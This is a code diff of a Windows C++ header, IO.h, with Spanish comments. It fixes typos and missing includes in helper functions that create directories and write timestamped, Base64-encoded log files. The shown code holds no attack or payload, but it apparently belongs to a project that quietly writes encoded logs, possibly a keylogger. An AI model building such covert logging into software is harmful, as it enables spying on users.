@@ -1,12 +1,12 @@
 #ifndef IO_H
 #define IO_H
 
+#include <windows.h>
 #include <string>
 #include <cstdlib>
 #include <fstream>
-#include "window.h"
 #include "Helper.h"
-#include "Base64"
+#include "Base64.h"
 
 namespace IO
 {
@@ -19,7 +19,7 @@ namespace IO
     }
     bool MkOneDr(std::string path)  //en caso de que sea necesario.
     {
-        return (bool)CreateDirectory(path.c_str(), NULL) || GetLasError() == ERROR_ALREADY_EXISTS;
+        return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
     }
 
     bool MkDir(std::string path) //relleno para arreglar un par de errores situacionales.
@@ -38,9 +38,9 @@ namespace IO
     template<class T>
     std::string WriteLog(const T &t)
     {
-        std::string path GetOurPath(true);
+        std::string path = GetOurPath(true);
         Helper::DateTime dt;
-        std::string name = dt.getDateTimeString("_") + ".log";
+        std::string name = dt.GetDateTimeString("_") + ".log";
 
         try
         {
